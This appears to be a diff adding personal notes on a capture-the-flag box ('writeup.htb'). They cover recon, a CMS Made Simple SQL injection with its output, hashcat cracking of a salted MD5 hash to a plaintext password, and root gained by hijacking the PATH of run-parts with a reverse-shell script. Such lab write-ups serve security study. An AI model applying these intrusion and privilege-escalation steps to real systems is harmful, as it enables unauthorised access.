@@ -1,0 +1,62 @@
+OS:
+- Linux
+
+Open Ports:
+- 22
+- 80
+
+- running webscan scripts
+- requests are being blocked
+- navigated to webpage
+- robots.txt
+- disallow /writeup/
+- navigate to /writeup/
+- IP getting blacklisted when attempting to run scans
+- checking source code of /writeup/
+CMS Made Easy
+- checking subversion on software website to enumerate dirs
+- found version in /doc/CHANGELOG.txt: Version 2.2.9.1
+
+found another robots.txt. potential dirs:
+Disallow: /assets/
+Disallow: /doc/
+Disallow: /lib/
+Disallow: /modules/
+Disallow: /tmp/
+Allow: /tmp/cache/
+
+
+- running sql exploit: CMS Made Simple < 2.2.10 - SQL Injection
+- got salt + hash
+- md5 password
+
+Exploit Results:
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+
+- using hashcat to crack
+
+hashcat hash info:
+MODE: 20
+TYPE: md5($salt.$pass)
+
+Hash cracked. Password:
+raykayjay9
+
+- logged into jkr through ssh
+- running pspy to monitor processes/crons:
+
+2020/11/26 02:33:56 CMD: UID=0    PID=2545   | sshd: jkr [priv]  
+2020/11/26 02:33:56 CMD: UID=0    PID=2546   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
+2020/11/26 02:33:56 CMD: UID=0    PID=2547   | run-parts --lsbsysinit /etc/update-motd.d 
+2020/11/26 02:33:56 CMD: UID=0    PID=2548   | uname -rnsom 
+2020/11/26 02:33:56 CMD: UID=0    PID=2549   | sshd: jkr [priv]  
+2020/11/26 02:33:56 CMD: UID=1000 PID=2550   | sshd: jkr@pts/1   
+
+- run-parts is not in first path location
+- created new-parts script and made executable that opens reverse shell
+- finding ways to trigger script
+- re-login to ssh
+- got root shell
